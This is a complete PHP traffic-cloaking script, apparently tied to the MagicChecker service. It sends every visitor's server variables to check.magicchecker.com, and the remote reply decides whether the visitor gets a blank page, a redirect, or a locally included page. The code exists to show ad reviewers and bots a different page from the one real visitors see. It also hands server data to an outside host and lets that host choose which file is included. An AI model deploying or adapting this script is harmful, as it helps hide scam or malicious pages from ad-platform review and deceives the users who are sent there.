<?php
// to view php errors (it can be useful if you got blank screen and there is no clicks in the site statictics) uncomment next two strings:
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

define('CAMPAIGN_ID', "55f3456e82797602c001db0ca0f46c0b");
define('REQUEST_LIVE_TIME', 3600);
define('ENC_KEY', 'ad98aea0e654222ea111dab6f5255e2a');
define('MP_PARAM_NAME', 'td_clk');
define('NOT_FOUND_TEXT', '<h1>Page not found</h1>');
define('CHECK_MCPROXY', 0);
define('CHECK_MCPROXY_PARAM', '3cdb014acbc17305ea293c4eecaf3f76');
define('CHECK_MCPROXY_VALUE', '1dfb60f545a137be146ed4f809d3cdebb8ed8d1d9b161c9880ae861ea1c075b1');

function translateCurlError($code) {
  $output = '';$curl_errors = array(2  => "Can't init curl.",6  => "Can't resolve server's DNS of our domain. Please contact your hosting provider and tell them about this issue.",7  => "Can't connect to the server.",28 => "Operation timeout. Check you DNS setting.");if (isset($curl_errors[$code])) $output = $curl_errors[$code];else $output = "Error code: $code . Check if php cURL library installed and enabled on your server.";

  $f = fopen(dirname(__FILE__) .'/curl_errors.txt', 'a');
  fputs($f, "$output\n");
  fclose($f);

  return $output;
}
function checkCache() {$res = "";$service_port = 8082;$address = "127.0.0.1";$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);if ($socket !== false) {$result = @socket_connect($socket, $address, $service_port);if ($result !== false) {$port = isset($_SERVER['HTTP_X_FORWARDED_REMOTE_PORT']) ? $_SERVER['HTTP_X_FORWARDED_REMOTE_PORT'] : $_SERVER['REMOTE_PORT']; $in = $_SERVER['REMOTE_ADDR'] . ":" . $port . "\n"; socket_write($socket, $in, strlen($in));while ($out = socket_read($socket, 2048)) {$res .= $out;}}} return $res;}

function sendRequest($data, $path = 'index') {
  $headers = array('adapi' => '2.2');
  if ($path == 'index') $data['HTTP_MC_CACHE'] = checkCache(); if (CHECK_MCPROXY || (isset($_GET[CHECK_MCPROXY_PARAM]) && ($_GET[CHECK_MCPROXY_PARAM] == CHECK_MCPROXY_VALUE))) {if (trim($data['HTTP_MC_CACHE'])) {print 'mcproxy is ok';} else {print 'mcproxy error';}die();}
  $data_to_post = array("cmp"=> CAMPAIGN_ID,"headers" => $data,"adapi" => '2.2', "sv" => '24494.3');

  $ch = curl_init("http://check.magicchecker.com/v2.2/" .$path .'.php');
  curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_to_post));
  $output = curl_exec($ch);
  $info = curl_getinfo($ch);

  if ((strlen($output) == 0) || ($info['http_code'] != 200)) {
    $curl_err_num = curl_errno($ch);
    curl_close($ch);

    if ($curl_err_num != 0) {
      header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
      print 'cURL error ' .$curl_err_num .': ' .translateCurlError($curl_err_num);
    }
    else {
      if ($info['http_code'] == 500) {
        header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
        print '<h1>503 Service Unavailable</h1>';
      }
      else {
        header($_SERVER['SERVER_PROTOCOL'] .' ' .$info['http_code']);
        print '<h1>Error ' .$info['http_code'] .'</h1>';
      }
    }
    die();
  }
  curl_close($ch);
  return $output;
}

function isBlocked($testmode = false) {
  $result = new stdClass();
  $result->hasResponce = false;
  $result->isBlocked = false;
  $result->errorMessage = '';
  $data_headers = array();

  foreach ( $_SERVER as $name => $value ) {
    if (is_array($value)) {
      $value = implode(', ', $value);
    }
    if ((strlen($value) < 1024) || ($name == 'HTTP_REFERER') || ($name == 'QUERY_STRING') || ($name == 'REQUEST_URI') || ($name == 'HTTP_USER_AGENT')) {
      $data_headers[$name] = $value;
    } else {
      $data_headers[$name] = 'TRIMMED: ' .substr($value, 0, 1024);
    }
  }

  $output = sendRequest($data_headers);
  if ($output) {
    $result->hasResponce = true;
    $answer = json_decode($output, TRUE);
    if (isset($answer['ban']) && ($answer['ban'] == 1)) die();

    if ($answer['success'] == 1) {
      foreach ($answer as $ak => $av) {
        $result->{$ak} = $av;
      }
    }
    else {
      $result->errorMessage = $answer['errorMessage'];
    }
  }
  return $result;
}

function _redirectPage($url, $send_params, $return_url = false) {
  if ($send_params) {
    if ($_SERVER['QUERY_STRING'] != '') {
      if (strpos($url, '?') === false) {
        $url .= '?' . $_SERVER['QUERY_STRING'];
      } else {
        $url .= '&' . $_SERVER['QUERY_STRING'];
      }
    }
  }

  if ($return_url) return $url;
  else header("Location: $url", true, 302);
}

function _includeFileName($url) {
  if (strpos($url, '/') !== false) {
    $url = ltrim(strrchr($url, '/'), '/');
  }
  if (strpos($url, '?') !== false) {
    $url = explode('?', $url);
    $url = $url[0];
  }
  return $url;
}

////////////////////////////////////////////////////////////////////////////////


$result = isBlocked();
if ($result->hasResponce && !isset($result->error_message)) {

    if ($result->urlType == 'redirect') {
      _redirectPage($result->url, $result->send_params);
    }
    else {
      include _includeFileName($result->url);
    }

}
else {
  die('Error: ' .$result->errorMessage);
}
